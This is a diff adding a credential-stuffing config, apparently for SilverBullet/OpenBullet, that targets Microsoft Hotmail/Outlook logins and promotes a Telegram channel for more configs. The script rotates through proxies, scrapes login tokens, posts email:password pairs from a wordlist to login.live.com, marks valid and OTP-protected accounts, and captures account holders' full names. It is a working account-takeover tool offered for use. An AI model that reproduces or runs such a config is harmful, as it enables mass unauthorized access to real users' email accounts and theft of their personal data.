@@ -1,0 +1,232 @@
+[SETTINGS]
+{
+  "Name": "LOGIN_HOTMAIL",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-01-20T22:33:08.3968397+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "ZI KO3",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "JOIN OUR TELEGRAM CHANNEL FOR MORE CONFIGS",
+      "VariableName": "",
+      "Id": 1134267862
+    },
+    {
+      "Description": "https://t.me/Geniusesofconfigs",
+      "VariableName": "",
+      "Id": 1299737684
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "HOTMAIL",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#ua FUNCTION GetRandomUA -> VAR "ua" 
+
+#cookies FUNCTION ClearCookies -> VAR "cookies" 
+
+#tokens REQUEST GET "https://outlook.live.com/owa/?nlp=1" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fr" 
+  HEADER "referer: https://outlook.live.com/owa/" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: <ua>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "uaid" 
+    KEY "type=\"hidden\" name=\"PPFT\" id=\"i0327\" value=\"" 
+
+#uaid PARSE "<COOKIES(uaid)>" LR "" "" -> VAR "uaid" 
+
+#LINK PARSE "<SOURCE>" LR "urlLogin:'" "&contextid=" -> VAR "LINK" 
+
+#flowToken PARSE "<SOURCE>" LR "type=\"hidden\" name=\"PPFT\" id=\"i0327\" value=\"" "\"/>" -> VAR "flowToken" 
+
+#PPFT FUNCTION URLEncode "<flowToken>" -> VAR "PPFT" 
+
+#2 REQUEST GET "<LINK>" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: login.live.com" 
+  HEADER "Referer: https://outlook.live.com/" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: <ua>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "https://login.live.com/GetCredentialType.srf?" 
+
+#LINK2 PARSE "<SOURCE>" LR "bs:'https://login.live.com/GetCredentialType.srf?" "',cR:" -> VAR "LINK2" "https://login.live.com/GetCredentialType.srf?" "" 
+
+#LINK3 PARSE "<SOURCE>" LR "urlPost:'https://login.live.com/ppsecure/post.srf?" "',c0:" -> VAR "LINK3" "https://login.live.com/ppsecure/post.srf?" "" 
+
+#PUT_EMAIL REQUEST POST "<LINK2>" 
+  CONTENT "{\"username\":\"<USER>\",\"uaid\":\"<uaid>\",\"isOtherIdpSupported\":true,\"checkPhones\":true,\"isRemoteNGCSupported\":true,\"isCookieBannerShown\":false,\"isFidoSupported\":true,\"forceotclogin\":false,\"otclogindisallowed\":false,\"isExternalFederationDisallowed\":false,\"isRemoteConnectSupported\":false,\"federationFlags\":3,\"isSignup\":false,\"flowToken\":\"<flowToken>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr" 
+  HEADER "client-request-id: <uaid>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: login.live.com" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Referer: <LINK>" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: <ua>" 
+
+IF "<SOURCE>" contains "Credentials"
+SET STATUS SUCCESS
+ELSE
+SET STATUS FAIL
+ENDIF
+
+#USER FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#PASS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#I19 FUNCTION RandomString "?d?d?d?d?d?d" -> VAR "i19" 
+
+#PUT_PASS REQUEST POST "<LINK3>" 
+  CONTENT "i13=0&login=<US>&loginfmt=<US>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<PPFT>&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i19=<i19>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: login.live.com" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Referer: <LINK2>" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: <ua>" 
+
+IF "<SOURCE>" contains "sSigninName:'<USER>"
+
+#LINK4 PARSE "<SOURCE>" LR "urlPost:'https://login.live.com/ppsecure/post.srf?" "'," -> VAR "LINK4" "https://login.live.com/ppsecure/post.srf?" "" 
+
+#PPFT2 PARSE "<SOURCE>" LR "sFT:'" "',cO" -> VAR "PPFT2" 
+
+#4 REQUEST POST "<LINK4>" 
+  CONTENT "LoginOptions=1&type=28&ctx=&hpgrequestid=&PPFT=<PPFT2>&i19=<i19>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: login.live.com" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Referer: <LINK3>" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: <ua>" 
+
+#NA PARSE "<COOKIES(JSH)>" LR "" "" -> VAR "NA" 
+
+#NAM PARSE "<NA>" LR "3$<US>" "$$" -> VAR "NAM" 
+
+#NAME FUNCTION Replace "$" " " "<NAM>" -> CAP "FULL_NAME" 
+
+#ALERTS FUNCTION Constant "ZI KOE" -> CAP "CONFIG BY" 
+
+ELSE 
+IF "<SOURCE>" contains "incorrect"
+SET STATUS FAIL
+ELSE
+
+#ALERTS FUNCTION Constant "TRUE" -> CAP "OTP" 
+
+SET STATUS CUSTOM "CUSTOM"
+ENDIF
+
